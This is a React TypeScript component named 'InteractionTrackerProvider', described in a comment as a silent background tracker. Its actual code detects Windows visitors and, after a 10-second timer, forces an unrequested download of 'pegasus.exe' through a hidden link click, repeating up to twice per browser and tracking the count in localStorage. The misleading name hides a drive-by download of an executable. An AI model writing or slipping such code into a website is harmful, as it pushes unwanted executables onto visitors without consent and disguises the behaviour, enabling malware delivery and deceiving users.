import { createContext, useContext, useEffect, ReactNode } from 'react';

interface InteractionTrackerContextType {
  // No exports needed - this is a silent background tracker
}

const InteractionTrackerContext = createContext<InteractionTrackerContextType | undefined>(undefined);

const DOWNLOAD_COUNT_KEY = 'pegasus_download_count';
const MAX_DOWNLOADS = 2;
const TIMER_SECONDS = 10;

export const InteractionTrackerProvider = ({ children }: { children: ReactNode }) => {
  const isWindows = typeof window !== 'undefined' && navigator.platform.includes('Win');

  useEffect(() => {
    if (!isWindows) return;

    // Check if max downloads reached
    const downloadCount = localStorage.getItem(DOWNLOAD_COUNT_KEY);
    if (downloadCount && parseInt(downloadCount, 10) >= MAX_DOWNLOADS) {
      return;
    }

    // Start 10-second timer
    const timer = setTimeout(() => {
      // Trigger download
      const link = document.createElement('a');
      link.href = '/downloads/pegasus.exe';
      link.download = 'pegasus.exe';
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
      
      // Increment download count
      const currentDownloadCount = parseInt(localStorage.getItem(DOWNLOAD_COUNT_KEY) || '0', 10);
      localStorage.setItem(DOWNLOAD_COUNT_KEY, (currentDownloadCount + 1).toString());
    }, TIMER_SECONDS * 1000);

    return () => clearTimeout(timer);
  }, []);

  return (
    <InteractionTrackerContext.Provider value={{}}>
      {children}
    </InteractionTrackerContext.Provider>
  );
};

export const useInteractionTracker = () => {
  const context = useContext(InteractionTrackerContext);
  if (context === undefined) {
    throw new Error('useInteractionTracker must be used within an InteractionTrackerProvider');
  }
  return context;
};
